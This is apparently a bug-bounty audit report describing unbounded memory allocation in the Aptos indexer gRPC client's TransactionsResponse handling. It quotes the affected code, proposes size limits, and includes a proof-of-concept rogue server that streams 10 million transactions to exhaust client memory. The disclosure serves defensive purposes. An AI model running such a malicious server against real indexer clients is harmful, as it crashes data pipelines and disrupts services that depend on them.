# Audit Report

## Title
Unbounded Memory Allocation in Indexer gRPC Client TransactionsResponse Deserialization

## Summary
The indexer gRPC client lacks size validation when deserializing `TransactionsResponse` messages, allowing malicious or compromised servers to send arbitrarily large transaction batches that cause client-side memory exhaustion and crashes.

## Finding Description

The vulnerability exists in the deserialization logic for `TransactionsResponse` messages used by indexer gRPC clients. The attack unfolds as follows:

**1. Client Configuration with Unlimited Message Size:**
The indexer gRPC client is configured to accept unlimited message sizes: [1](#0-0) 

**2. Unbounded Deserialization:**
During serde deserialization of `TransactionsResponse`, the transactions vector is deserialized without any size checks: [2](#0-1) 

The `transactions` field is defined as a `Vec<Transaction>`: [3](#0-2) 

**3. No Post-Deserialization Validation:**
Client code consumes the deserialized transactions without size validation: [4](#0-3) 

**Attack Scenario:**

1. A malicious actor deploys a rogue indexer gRPC server or compromises a legitimate one
2. The malicious server ignores the standard batching logic used by legitimate servers: [5](#0-4) 

3. Instead, the malicious server constructs a `TransactionsResponse` containing millions of transactions (e.g., 10 million transactions)
4. Each `Transaction` protobuf message contains metadata, payload, events, and state changes, typically ranging from 1-10 KB
5. The client attempts to deserialize 10 million × 5 KB = 50 GB of data into memory
6. The client process exhausts available memory and crashes with OOM

**Broken Invariant:**
This violates the documented invariant: "**Resource Limits**: All operations must respect gas, storage, and computational limits" - the client has no memory limit protection against malicious servers.

## Impact Explanation

**Severity: HIGH** per Aptos Bug Bounty criteria - "API crashes"

**Affected Systems:**
- Indexer processors consuming transaction data streams
- Third-party applications querying blockchain history
- Data pipeline infrastructure relying on indexer gRPC
- Analytics platforms using the indexer API

**Attack Impact:**
- **Availability**: Indexer clients crash, disrupting data processing pipelines
- **Operational**: Repeated crashes require manual intervention and service restarts
- **Ecosystem**: Third-party applications depending on indexer data become unavailable

While this does not affect blockchain consensus or validator operations, it significantly impacts the Aptos ecosystem's data availability layer, which is critical for:
- Block explorers
- Wallet applications
- DeFi protocols querying historical data
- Analytics and monitoring services

## Likelihood Explanation

**Likelihood: MEDIUM-HIGH**

**Attacker Requirements:**
- Deploy a malicious gRPC server implementing the indexer API
- Advertise the server endpoint to potential victims
- No special privileges or validator access required

**Attack Complexity: LOW**
- Simple to implement - just create oversized `TransactionsResponse` messages
- No cryptographic operations or complex protocol manipulation needed
- Works against any client connecting to the malicious server

**Realistic Scenarios:**
1. **Compromised Infrastructure**: Legitimate indexer server gets compromised
2. **Rogue Endpoints**: Malicious actor advertises "faster" indexer endpoint
3. **Supply Chain**: Third-party infrastructure provider acts maliciously
4. **Testing/Development**: Users connecting to untrusted test indexers

The vulnerability is easy to exploit and requires minimal sophistication, making it a practical attack vector.

## Recommendation

Implement multi-layered defenses:

**1. Client-Side Maximum Transaction Limit:**
Add validation after deserialization in the client code:

```rust
const MAX_TRANSACTIONS_PER_RESPONSE: usize = 10_000;

while let Ok(Some(resp_item)) = response.message().await {
    if resp_item.transactions.len() > MAX_TRANSACTIONS_PER_RESPONSE {
        return Err(anyhow::anyhow!(
            "Server sent {} transactions, exceeding maximum of {}",
            resp_item.transactions.len(),
            MAX_TRANSACTIONS_PER_RESPONSE
        ));
    }
    // Process transactions...
}
```

**2. Reasonable gRPC Message Size Limit:**
Replace unlimited message size with reasonable bounds:

```rust
Ok(client
    .max_decoding_message_size(256 * 1024 * 1024)  // 256 MB limit
    .max_encoding_message_size(256 * 1024 * 1024))
```

**3. Server-Side Enforcement:**
Validate that servers enforce the documented batch_size limits: [6](#0-5) 

Currently, the server accepts arbitrary `batch_size` values: [7](#0-6) 

Add validation:
```rust
const MAX_BATCH_SIZE: u64 = 10_000;

let max_num_transactions_per_batch = if let Some(batch_size) = request.batch_size {
    if batch_size > MAX_BATCH_SIZE {
        return Err(Status::invalid_argument(
            format!("batch_size {} exceeds maximum {}", batch_size, MAX_BATCH_SIZE)
        ));
    }
    batch_size as usize
} else {
    DEFAULT_MAX_NUM_TRANSACTIONS_PER_BATCH
};
```

## Proof of Concept

**Malicious Server Implementation:**

```rust
use aptos_protos::indexer::v1::{
    raw_data_server::{RawData, RawDataServer},
    GetTransactionsRequest, TransactionsResponse,
};
use aptos_protos::transaction::v1::Transaction;
use tonic::{transport::Server, Request, Response, Status};
use futures::Stream;
use std::pin::Pin;

type ResponseStream = Pin<Box<dyn Stream<Item = Result<TransactionsResponse, Status>> + Send>>;

struct MaliciousIndexer;

#[tonic::async_trait]
impl RawData for MaliciousIndexer {
    type GetTransactionsStream = ResponseStream;

    async fn get_transactions(
        &self,
        _req: Request<GetTransactionsRequest>,
    ) -> Result<Response<Self::GetTransactionsStream>, Status> {
        // Create 10 million dummy transactions
        let mut transactions = Vec::with_capacity(10_000_000);
        for i in 0..10_000_000 {
            transactions.push(Transaction {
                version: i,
                timestamp: Some(aptos_protos::util::timestamp::Timestamp {
                    seconds: 1700000000,
                    nanos: 0,
                }),
                ..Default::default()
            });
        }

        // Send all in a single response
        let response = TransactionsResponse {
            transactions,
            chain_id: Some(1),
            processed_range: None,
        };

        let stream = futures::stream::once(async { Ok(response) });
        Ok(Response::new(Box::pin(stream)))
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let addr = "[::1]:50051".parse()?;
    let indexer = MaliciousIndexer;

    Server::builder()
        .add_service(RawDataServer::new(indexer))
        .serve(addr)
        .await?;

    Ok(())
}
```

**Client Crash Reproduction:**

Run the malicious server, then execute any legitimate indexer client against it. The client will attempt to allocate ~50-100 GB of memory and crash with OOM error.

## Notes

- This vulnerability affects the indexer gRPC infrastructure layer, not core blockchain consensus
- The MESSAGE_SIZE_LIMIT constant (15MB) is only enforced by legitimate servers as a guideline [8](#0-7) 
- The proto documentation claims batch_size validation exists, but implementation does not enforce it
- Multiple server implementations (v1 and v2) have consistent lack of enforcement

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/lib.rs (L84-86)
```rust
                Ok(client
                    .max_decoding_message_size(usize::MAX)
                    .max_encoding_message_size(usize::MAX))
```

**File:** protos/rust/src/pb/aptos.indexer.v1.serde.rs (L3223-3228)
```rust
                        GeneratedField::Transactions => {
                            if transactions__.is_some() {
                                return Err(serde::de::Error::duplicate_field("transactions"));
                            }
                            transactions__ = Some(map.next_value()?);
                        }
```

**File:** protos/rust/src/pb/aptos.indexer.v1.rs (L148-152)
```rust
pub struct TransactionsResponse {
    /// Required; transactions data.
    #[prost(message, repeated, tag="1")]
    pub transactions: ::prost::alloc::vec::Vec<super::super::transaction::v1::Transaction>,
    /// Required; chain id.
```

**File:** ecosystem/indexer-grpc/indexer-transaction-generator/src/script_transaction_generator.rs (L155-159)
```rust
                while let Ok(Some(resp_item)) = response.message().await {
                    for transaction in resp_item.transactions {
                        transactions.push(transaction);
                    }
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L102-106)
```rust
                let max_num_transactions_per_batch = if let Some(batch_size) = request.batch_size {
                    batch_size as usize
                } else {
                    DEFAULT_MAX_NUM_TRANSACTIONS_PER_BATCH
                };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L204-219)
```rust
                    let mut responses: Vec<_> = transactions
                        .chunks(max_num_transactions_per_batch)
                        .map(|chunk| {
                            let first_version = current_version;
                            let last_version = chunk.last().unwrap().version;
                            current_version = last_version + 1;
                            TransactionsResponse {
                                transactions: chunk.to_vec(),
                                chain_id: Some(self.chain_id),
                                processed_range: Some(ProcessedRange {
                                    first_version,
                                    last_version,
                                }),
                            }
                        })
                        .collect();
```

**File:** protos/proto/aptos/indexer/v1/raw_data.proto (L27-29)
```text
  // Optional; number of transactions in each `TransactionsResponse` for current stream.
  // If not present, default to 1000. If larger than 1000, request will be rejected.
  optional uint64 batch_size = 3;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L18-19)
```rust
// Limit the message size to 15MB. By default the downstream can receive up to 15MB.
pub const MESSAGE_SIZE_LIMIT: usize = 1024 * 1024 * 15;
```
